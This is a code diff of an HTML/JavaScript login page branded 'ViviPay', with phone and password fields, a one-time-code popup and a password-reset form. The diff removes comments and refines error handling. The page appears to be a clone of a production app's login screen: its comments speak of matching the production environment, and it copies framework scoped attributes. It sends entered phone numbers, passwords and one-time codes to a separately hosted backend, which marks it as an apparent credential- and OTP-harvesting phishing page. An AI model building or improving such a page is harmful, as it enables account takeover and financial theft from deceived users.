@@ -7,7 +7,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     
     <style>
-        /* Exact App Reset to match production environment */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -22,13 +21,11 @@
             overflow-x: hidden;
         }
 
-        /* Standard App Wrapper */
         #app {
             width: 100%;
             height: 100%;
         }
 
-        /* Client Dom Spec */
         main[data-v-6ffee151] {
             height: 100vh;
             width: 100%;
@@ -61,7 +58,6 @@
             transform: translateY(-25px);
         }
 
-        /* UI Native Field Styling */
         .input-field-group {
             background-color: #f6f9fe;
             border-radius: 30px;
@@ -99,7 +95,6 @@
             color: #bcccdf;
         }
 
-        /* Utilities Structure */
         .form-utilities {
             display: flex;
             justify-content: space-between;
@@ -142,7 +137,6 @@
             cursor: pointer;
         }
 
-        /* Action Login Button */
         .submit-btn {
             background-color: #1a85ff;
             color: #ffffff;
@@ -160,7 +154,6 @@
             background-color: #0071eb;
         }
 
-        /* Bottom Privacy Spec */
         .policy-container-box {
             margin-top: 20px;
             height: 3rem;
@@ -461,7 +454,6 @@
                             <input type="checkbox" id="save-pwd">
                             Save Password
                         </label>
-                        <!-- FIXED: ID properly mapped here -->
                         <span class="forgot-pass-link" id="triggerForgot">Forgot password</span>
                     </div>
 
@@ -479,7 +471,6 @@
         </main>
     </div>
 
-    <!-- OTP Popup Layer -->
     <div class="otp-modal-overlay" id="otpModal">
         <div class="otp-modal-container">
             <button class="otp-close-btn" id="closeOtpBtn">&times;</button>
@@ -496,7 +487,6 @@
         </div>
     </div>
 
-    <!-- Native Modify Password Layer Overlay Dashboard -->
     <div class="modify-modal-overlay" id="modifyPasswordModal">
         <div class="modify-header">
             <span class="modify-back-arrow" id="backToLoginBtn">&#10094;</span>
@@ -510,7 +500,6 @@
             </div>
             <div class="modify-form-title">Modify password Form</div>
         </div>
-        <!-- FIXED: Wrapped in a real form submission pipeline -->
         <form id="forgotForm" onsubmit="handleModifyPasswordSubmit(event)" class="modify-form-container">
             <div class="modify-row">
                 <span class="modify-label">Phone</span>
@@ -545,14 +534,13 @@
         let isResetFlow = false;
         let resetPhoneNumber = "";
 
-        // URL Selector Engine
-        const BACKEND_URL = window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' 
+        // Dynamic URL Routing Target Logic
+        const BACKEND_URL = (window.location.hostname === '127.0.0.1' || window.location.hostname === 'localhost' || window.location.protocol === 'file:') 
             ? 'http://127.0.0.1:4000' 
             : 'https://vivipay-backend.onrender.com';
 
-        // Toggle UI Triggers
         if(triggerForgot) {
-            triggerForgot.addEventListener('click', (e) => {
+            triggerForgot.addEventListener('click', () => {
                 modifyPasswordModal.classList.add('active');
             });
         }
@@ -575,7 +563,7 @@
             startTimer();
         }
 
-        // 1. LOGIN PIPELINE
+        // 1. LOGIN SUBMIT
         loginForm.addEventListener('submit', async (e) => {
             e.preventDefault(); 
             isResetFlow = false;
@@ -596,11 +584,13 @@
                 if (data.success) {
                     currentUserId = data.userId; 
                     triggerOtpPopup(phoneNumber);
-                } else { alert("Server Error! Try again."); }
-            } catch (error) { alert("Cannot connect to Backend Server!"); }
+                } else { alert("Server Error: " + (data.message || "Unknown error")); }
+            } catch (error) { 
+                alert("Cannot connect to Backend! Check if server.js is running on port 4000."); 
+            }
         });
 
-        // 2. FORGOT PASSWORD PIPELINE
+        // 2. FORGOT PASSWORD SUBMIT
         async function handleModifyPasswordSubmit(event) {
             event.preventDefault();
             const phone = document.getElementById('forgotPhone').value;
@@ -617,3 +607,13 @@
                 });
                 const data = await response.json();
                 if(data.success) {
+                    isResetFlow = true;
+                    resetPhoneNumber = phone;
+                    triggerOtpPopup(phone); 
+                } else { alert("Server Error: " + (data.message || "Unknown error")); }
+            } catch (error) { 
+                alert("Cannot connect to Backend! Check if server.js is running on port 4000."); 
+            }
+        }
+
+        closeOtpBtn.a
